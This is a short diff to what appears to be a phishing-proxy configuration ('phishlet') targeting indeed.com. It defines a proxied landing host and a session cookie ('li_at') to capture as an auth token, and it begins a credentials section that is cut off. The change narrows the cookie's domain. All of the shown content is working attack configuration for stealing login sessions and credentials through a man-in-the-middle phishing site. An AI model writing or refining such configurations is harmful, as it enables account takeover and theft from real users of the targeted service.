@@ -4,7 +4,7 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'indeed.com', session: true, is_landing: true}
 sub_filters: []
 auth_tokens:
-  - domain: 'indeed.com'
+  - domain: 'www.indeed.com'
     keys: ['li_at']
 credentials:
   username:
